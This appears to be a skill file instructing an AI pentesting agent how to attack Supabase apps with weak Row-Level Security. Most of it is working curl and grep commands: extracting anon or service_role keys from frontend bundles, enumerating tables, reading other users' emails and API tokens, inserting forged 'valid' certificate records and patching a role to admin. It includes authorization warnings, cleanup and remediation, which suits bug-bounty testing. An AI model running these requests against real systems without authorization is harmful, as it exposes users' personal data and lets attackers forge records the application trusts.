---
name: supabase
description: Supabase / PostgREST Row-Level-Security playbook — pull the anon (or leaked service_role) key out of the frontend JS, map tables from the auto-generated OpenAPI spec, test anonymous RLS READ disclosures (PII/secret leaks), and anonymous RLS WRITE abuse (insert/update/delete — e.g. forging "certificate"/verification/entitlement rows the app trusts). Use when the target's frontend talks to *.supabase.co, ships an anon JWT, or you see /rest/v1/, /auth/v1/, /storage/v1/ requests.
allowed-tools:
  - http
  - shell
  - web_fetch
  - grep
  - file_write
  - read_payloads
  - confirm_finding
---

# Supabase RLS playbook

Supabase exposes PostgreSQL directly to the browser through **PostgREST** (`/rest/v1/`),
**GoTrue** auth (`/auth/v1/`), and **Storage** (`/storage/v1/`). The browser authenticates
with a public **anon** JWT, and the *only* thing standing between an anonymous attacker and
the database is **Row-Level Security (RLS)** policies. Misconfigured or missing RLS is the
entire bug class:

- **RLS disclosure** — `SELECT` on a table returns rows it shouldn't (PII, tokens, other tenants).
- **RLS write abuse** — `INSERT` / `UPDATE` / `DELETE` succeeds anonymously, so you can **forge
  records the application trusts** (a "certificate" / verification / license / entitlement row,
  an admin flag, a balance, someone else's data).

> Authorized targets only. Treat the database as production: read a single marker row to prove
> disclosure, write ONE clearly-labelled marker row to prove write, then clean up. Never dump
> whole tables of real PII, never mass-modify, never `DELETE` real rows. The PoC is "I read/wrote
> one row I shouldn't be able to", not "I exfiltrated the customer base".

Execution rule: substitute the real Supabase project ref, anon key, table, and marker IDs before running commands. Never write literal placeholders such as `<ref>`, `<table>`, `<col>`, or `<returned-id>` to files; if a value is unknown, discover it first or ask once.

---

## 0. Find the project URL + anon key in the frontend JS

The project ref and anon key are *meant* to be public — they ship in the client bundle. You need
both before you can talk to the API.

```sh
# Pull the main page + every script it references, then grep for the markers.
curl -ksS "https://TARGET/" -o /tmp/sb_index.html
grep -oE 'src="[^"]+\.js"' /tmp/sb_index.html | sed 's/src="//;s/"//' > /tmp/sb_js.txt
# Fetch each bundle (use the http/web_fetch tool or curl) into /tmp/sb_bundles/ ...
```

Grep the HTML and every JS bundle for:

```sh
# Project URL — gives you <ref>.supabase.co
grep -roE 'https://[a-z0-9]{20}\.supabase\.co' /tmp/sb_bundles/ | sort -u
grep -roiE 'supabase[._-]?url["'\'' :=]+[^"'\'' ,)]+'   /tmp/sb_bundles/

# Anon / service_role key — a JWT (eyJ...). Supabase keys decode to {"role":"anon"|"service_role"}
grep -roE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' /tmp/sb_bundles/ | sort -u
grep -roiE 'supabase[._-]?(anon[._-]?)?key["'\'' :=]+[^"'\'' ,)]+' /tmp/sb_bundles/
grep -roiE 'createClient\([^)]*\)' /tmp/sb_bundles/
```

Also worth checking: `.env` / `.env.local` left on the host, `/_next/static/`, source maps
(`*.js.map`), `config.js`, and `window.__SUPABASE__` / `__NEXT_DATA__` JSON blobs.

### Decode every JWT you find — this is the most important triage step

```sh
echo "<jwt-payload-b64url>" | tr '_-' '/+' | base64 -d 2>/dev/null | jq .
```

- `"role":"anon"`  → the normal public key. RLS is the only protection. **This is expected to
  be public — its presence is NOT a finding by itself.** The finding is what it can *do*.
- `"role":"service_role"` → **CRITICAL on its own.** The service_role key **bypasses RLS
  entirely**. If it shipped to the browser (or any client-reachable place), that's a
  full-database read/write disclosure — report immediately, do not need any RLS hole.
- Note `ref` / `iss` (the project ref) and `exp`.

Save them for reuse:

```sh
SB="https://<ref>.supabase.co"
KEY="eyJ...<anon key>..."
```

---

## 1. Map the database from the OpenAPI spec (disclosure with zero rows)

PostgREST publishes a Swagger/OpenAPI document at the REST root. It lists **every table and
column the anon role can see** — a schema disclosure even before you read any data.

```sh
curl -ksS "$SB/rest/v1/" -H "apikey: $KEY" | jq '.definitions | keys'
# or the paths:
curl -ksS "$SB/rest/v1/" -H "apikey: $KEY" | jq '.paths | keys'
```

If you get a schema back, record the table names. No spec? Brute a small list of likely tables:
`read_payloads(skill="supabase", file="common-tables.txt")` and probe each with a `HEAD`/`limit=1`
read (next section). Pay attention to names that imply trust: `certificates`, `verifications`,
`licenses`, `entitlements`, `subscriptions`, `kyc`, `documents`, `invites`, `roles`, `admins`.

---

## 2. RLS READ disclosure — what can `anon` SELECT?

Every PostgREST call needs **both** headers:

```sh
curl -ksS "$SB/rest/v1/<table>?select=*&limit=1" \
  -H "apikey: $KEY" -H "Authorization: Bearer $KEY"
```

Interpret the response:

| Response | Meaning |
| --- | --- |
| `200` + JSON rows | **Readable by anon.** If the table holds PII/secrets/other tenants → disclosure finding. |
| `200` + `[]` | RLS is filtering you out **or** the table is empty. Add no filter / a known id to disambiguate. |
| `401` / `"No API key found"` | Missing/!invalid `apikey` header. |
| `404` | Table not exposed in this schema. |
| `403` + code `42501` "permission denied" | RLS (or grants) are blocking — good, that table is protected. |

Techniques once a table is readable:

```sh
# Confirm it's REAL data, not your own row: count, and pull distinct owner ids.
curl -ksS "$SB/rest/v1/<table>?select=count" -H "apikey: $KEY" -H "Authorization: Bearer $KEY" \
     -H "Prefer: count=exact" -I        # Content-Range header shows total rows

# Cross-tenant: read a row you do NOT own (e.g. a different user_id) to prove RLS isn't scoping.
curl -ksS "$SB/rest/v1/profiles?select=id,email,phone&user_id=eq.<someone-elses-uuid>" \
     -H "apikey: $KEY" -H "Authorization: Bearer $KEY"

# Column-level: even if rows are scoped, a permissive policy may expose secret columns.
curl -ksS "$SB/rest/v1/users?select=id,email,stripe_customer_id,api_token&limit=1" \
     -H "apikey: $KEY" -H "Authorization: Bearer $KEY"
```

**Impact for the report:** read ONE record proving you can see data you shouldn't (another
user's email/PII, an API token, a private document URL). Quote the row count from
`Content-Range` to show scale without dumping it.

---

## 3. RLS WRITE abuse — anonymous record forgery

This is the high-severity case: a missing/permissive `INSERT`/`UPDATE` policy lets `anon` create
or mutate rows the application later trusts. "Certificate forgery" is the canonical example — a
`certificates` (or `verifications` / `licenses` / `badges` / `entitlements`) table that the app
renders as proof-of-something, with an `INSERT` policy of `true` (or no RLS at all).

### 3a. Probe for write — INSERT a labelled marker

```sh
curl -ksS -X POST "$SB/rest/v1/<table>" \
  -H "apikey: $KEY" -H "Authorization: Bearer $KEY" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=representation" \
  -d '{"<col>":"PENTEST-MARKER-do-not-trust"}'
```

| Response | Meaning |
| --- | --- |
| `201` + the inserted row echoed back | **Anonymous write confirmed.** Forgery is possible. |
| `400` "null value in column ... violates not-null" / "column ... does not exist" | Write is **allowed** — you just missed required columns. Add them and retry; this is still a finding. |
| `403` `42501` "new row violates row-level security policy" | RLS `WITH CHECK` is blocking — protected. |
| `401` | bad/missing key headers. |

`Prefer: return=representation` makes PostgREST echo the created row (including DB-assigned
`id`/`created_at`), which is your proof.

### 3b. Forge the trusted record (the actual exploit)

Once `INSERT` works, populate the columns the app relies on to forge a record. For a certificate
table that means a believable, attacker-controlled "valid" entry:

```sh
curl -ksS -X POST "$SB/rest/v1/certificates" \
  -H "apikey: $KEY" -H "Authorization: Bearer $KEY" \
  -H "Content-Type: application/json" -H "Prefer: return=representation" \
  -d '{
        "holder_name":"PENTEST Forged Holder",
        "credential":"PENTEST-FORGED — proof of anon RLS write",
        "status":"valid",
        "issued_at":"2025-01-01T00:00:00Z"
      }'
```

Then **verify the forgery end-to-end**: load the public verification page / API the app uses to
check certificates and confirm it now reports your forged row as genuine
(`$SB/rest/v1/certificates?id=eq.<returned-id>` or the app's own `/verify/<id>` route). That
"the app trusts my forged record" step is what turns this from a raw write into a real impact.

### 3c. UPDATE / DELETE (privilege escalation, tampering)

```sh
# Flip your own role / a flag the app trusts — only if you can target a row you shouldn't own.
curl -ksS -X PATCH "$SB/rest/v1/profiles?id=eq.<your-id>" \
  -H "apikey: $KEY" -H "Authorization: Bearer $KEY" \
  -H "Content-Type: application/json" -H "Prefer: return=representation" \
  -d '{"role":"admin"}'
```

Only run `PATCH`/`DELETE` against rows **you created** (your marker, your own account). A
successful `PATCH` on a column like `role`/`is_admin`/`balance`/`verified` is a privilege-
escalation finding; demonstrate it on your own row rather than mutating real users.

### 3d. Clean up

Delete every marker/forged row you created and note in the report that you did:

```sh
curl -ksS -X DELETE "$SB/rest/v1/<table>?id=eq.<your-marker-id>" \
  -H "apikey: $KEY" -H "Authorization: Bearer $KEY"
```

---

## 4. Adjacent Supabase surfaces (check while you're here)

- **RPC / SECURITY DEFINER functions:** `POST $SB/rest/v1/rpc/<fn>` with `{}` — definer
  functions run with elevated rights and often skip RLS. Enumerate from the OpenAPI `paths`.
- **Open signup → authenticated role:** `POST $SB/auth/v1/signup` (`{"email","password"}`).
  Some policies grant far more to `authenticated` than `anon`; getting a real session token may
  unlock tables that were closed to anon. Use a throwaway address.
- **Storage:** `GET $SB/storage/v1/object/list/<bucket>` (with the key) and public objects at
  `$SB/storage/v1/object/public/<bucket>/<path>`. Public buckets full of private files are a
  common disclosure.
- **`Prefer: count=exact` + `Content-Range`** quantifies any readable table without dumping it.

---

## 5. Triers, severity & reporting

Severity guide (map to the program's scale; Bugcrowd VRT-style P-levels):

- Leaked **service_role** key reachable by clients → **P1/critical** (full DB read+write, RLS bypass).
- Anonymous **write/forgery** of a trusted record, or **UPDATE** of a privilege/trust column → **P1–P2**.
- Anonymous **read** of other users' PII / secrets / tokens → **P2–P3** (scale + sensitivity).
- Schema disclosure only (OpenAPI lists tables/columns, no readable rows) → **P4/low / informational**.

Before you call `confirm_finding`, you MUST have:
1. The exact request (method, URL, headers shown with the key **redacted to `apikey: <anon>`**) and the response proving it.
2. For writes: the echoed `id` of the row you created **and** evidence the app trusts it, **and** confirmation you deleted it.
3. Concrete impact in one sentence ("any anonymous visitor can forge a certificate the /verify page accepts as valid").

**Remediation to include:** enable RLS on every exposed table (`ALTER TABLE ... ENABLE ROW LEVEL
SECURITY;`), write explicit `USING`/`WITH CHECK` policies scoped to `auth.uid()`, never expose
write to `anon`, keep `service_role` server-side only, and lock down `SECURITY DEFINER` RPCs.

When you have a reproduced finding with a real request/response and impact, call `confirm_finding`.
